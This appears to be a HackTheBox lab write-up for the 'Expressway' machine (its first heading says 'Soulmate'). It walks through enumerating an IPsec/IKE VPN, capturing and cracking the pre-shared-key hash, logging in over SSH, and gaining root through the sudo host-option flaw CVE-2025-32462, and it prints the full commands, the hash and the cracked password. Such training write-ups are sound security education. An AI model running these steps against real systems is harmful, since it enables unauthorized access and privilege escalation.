---
title: Expressway - HTB
date: 2026-01-22
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc]
image:
  base: /assets/img/posts/htb/expressway
active: true
difficulty: easy
os: linux
description: "Expressway is the 1st machine of HackTheBox Season 9."
pawned: root
---

# Soulmate
IP: `10.129.11.184`

# Scan
Using `nmap`, the following ports are discovered:
```bash
sudo nmap -n -sV -sS -Pn -p- -oN scan.txt 10.129.238.52 
Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-01-25 10:46 EST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -sU -p- -T4 --min-rate 1000 10.129.238.52 -oN scan-udp.txt
Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-01-25 11:28 EST
PORT    STATE SERVICE
500/udp open  isakmp

sudo nmap -sU -sC -sV -p500 10.129.238.52
Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-01-25 11:44 EST
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

# Foothold
After the TCP scan, nothing except SSH. Then after UDP scan we find an interesting VPN service: IPSec/IKE.
Time for search: https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting

```bash
sudo ike-scan -M 10.129.238.52
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52	Main Mode Handshake returned
	HDR=(CKY-R=979dc86fe12d886b)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.094 seconds (10.59 hosts/sec).  1 returned handshake; 0 returned notify
```

From this IPSec/IKE posts:
```txt
The value of the last line is also very important:
...
1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output).
...
```

Finding the correct ID (group name)
```bash
ike-scan -P -M -A -n fakeID <IP>
```
This return ID, so not good to go!

Testing with `iker`: https://github.com/isaudits/scripts.git
```bash
git clone https://github.com/isaudits/scripts.git
cd scripts

sudo ./iker.py expressway.htb

iker v. 1.1

The ike-scan based script that checks for security flaws in IPsec-based VPNs.

                               by Julio Gomez ( jgo@portcullis-security.com )

Starting iker (http://labs.portcullis.co.uk/tools/iker) at Sun, 25 Jan 2026 12:14:57 +0000
[*] Discovering IKE services, please wait...
[*] IKE service identified at: b'10.129.238.52'
[*] IKE service identified at: b'HDR=(CKY-R=261b7dcb2dbb641d)'
[*] IKE service identified at: b'SA=(Enc=3DES'
[*] IKE service identified at: b'VID=09002689dfd6b712'
[*] IKE service identified at: b'VID=afcad71368a1f1c96b8696fc77570100'
[*] Checking for IKE version 2 support...
[*] IKE version 2 is supported by b'10.129.238.52'
[*] IKE version 2 is supported by b'HDR=(CKY-R=7a4b0709a2bcc443,'
[*] IKE version 1 support was not identified in this host (b'HDR=(CKY-R=7a4b0709a2bcc443,'). iker will not perform more tests against this host.

[*] Trying to fingerprint the devices. This proccess is going to take a while (1-5 minutes per IP). Be patient...
[*] The device b'10.129.238.52' could not been fingerprinted because no transform is known.
[*] The device b'HDR=(CKY-R=261b7dcb2dbb641d)' could not been fingerprinted because no transform is known.
[*] The device b'SA=(Enc=3DES' could not been fingerprinted because no transform is known.
[*] The device b'VID=09002689dfd6b712' could not been fingerprinted because no transform is known.
[*] The device b'VID=afcad71368a1f1c96b8696fc77570100' could not been fingerprinted because no transform is known.

[*] Looking for accepted transforms at b'10.129.238.52'
[====================] 100% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms at b'HDR=(CKY-R=261b7dcb2dbb641d)'
[====================] 200% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms at b'SA=(Enc=3DES'
[====================] 300% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms at b'VID=09002689dfd6b712'
[====================] 400% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms at b'VID=afcad71368a1f1c96b8696fc77570100'
[====================] 500% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms in aggressive mode at b'10.129.238.52'
[====================] 100% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms in aggressive mode at b'HDR=(CKY-R=261b7dcb2dbb641d)'
[====================] 200% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms in aggressive mode at b'SA=(Enc=3DES'
[====================] 300% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms in aggressive mode at b'VID=09002689dfd6b712'
[====================] 400% - Current transform: 7/256,2,65001,5
[*] Looking for accepted transforms in aggressive mode at b'VID=afcad71368a1f1c96b8696fc77570100'
[====================] 500% - Current transform: 7/256,2,65001,5

Results:
--------

Resuls for IP b'10.129.238.52':

[+] The IKE service could be discovered (Risk: LOW)
[+] IKE v2 is supported (Risk: Informational)

Resuls for IP b'HDR=(CKY-R=261b7dcb2dbb641d)':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'SA=(Enc=3DES':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'VID=09002689dfd6b712':

[+] The IKE service could be discovered (Risk: LOW)

Resuls for IP b'VID=afcad71368a1f1c96b8696fc77570100':

[+] The IKE service could be discovered (Risk: LOW)
iker finished at Sun, 25 Jan 2026 12:15:12 +0000

```

This gives a `output.xml` but nothing comes out of it. However, getting back at the results, I saw I didnt try `Aggressive` mode using `ike-scan`:
```bash
sudo ike-scan -M -A expressway.htb
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52	Aggressive Mode Handshake returned
	HDR=(CKY-R=29e6bc2d625ecc8a)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.092 seconds (10.88 hosts/sec).  1 returned handshake; 0 returned notify
```

>[!success] ID Retrieved: ike@expressway.htb

With this we can capture the hash:
```bash
sudo ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt expressway.htb
```

Cracking hash:
Hash is SHA1 and AUTH is PSK
```bash
hashcat -h | grep IKE
   5300 | IKE-PSK MD5                                                | Network Protocol
   5400 | IKE-PSK SHA1                                               | Network Protocol

82789f6393976e8397742b89fd93d506b0a38b26350856ab714b83bfc86660905205b2efb634ed039cd69362c320a0155264cf596eeaebf38691be745cbc715a280553d1e1cbeda600878a354a510d09af8aef4509e718691c8a086fc43a6fab5ce89babce57e585ec7ef5046f2673aadbedea1efc3dd1cffbbc83ecd62b927e:a0c626c8d8d6090d9be9df77c6ded713e62ede5f71fe40a7c591f85d4fe1aace6d16713288f23b012a3adfd2a4eef19361556ef252451047eedb6beecc93d7767ddfcae825e4c8ec77884fefe7c33257b65f9f240473783b6e735db26d19f070fb21b2179813279c1bf92094f1b5efc4d455160e512418ee6d44e6b98dde59fa:838609e1a0ca9976:09d3c7466dc206a4:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:dd6c433fb61e73abf3bd8e65ea6eb5ab0815c3c4:dcb9ef113bed703d9470391e0d30fedf4f6cda3a200ddb99f215bdf8ad182d96:ac4b74fab9f62b5c628fb29c4502aecedcb9560a:freakingrockstarontheroad
```

>[!success] Password cracked: freakingrockstarontheroad

# User
Trying SSH with ike
```bash
ssh ike@expressway.htb
ike@expressway.htb's password: freakingrockstarontheroad
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ cat user.txt 
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

# Root
Once we are inside we always start a basic enumeration:
```bash
uname -a
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux

lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux forky/sid
Release:	n/a
Codename:	forky

sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.

sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

The `Sudo 1.9.17` is exploitable -> [Sudo 1.9.17 Host Option - Elevation of Privilege CVE-2025-32462](https://www.exploit-db.com/exploits/52354)

We need a subdomain for the exploit to work and we check some places for it:
- Websites
- /etc/hosts
- Logs (/var/log/)
- ...

See the following findings:
```bash
cat /var/www/html/index.html | grep '.expressway.htb'

cat /etc/hosts
127.0.0.1	localhost expressway
127.0.1.1	expressway.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

grep -R ".expressway.htb" /var/log 2>/dev/null
/var/log/squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

We found our target, we can try to use the exploit:
```bash
sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL

sudo -h offramp.expressway.htb -i
root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:~# cat /root/root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
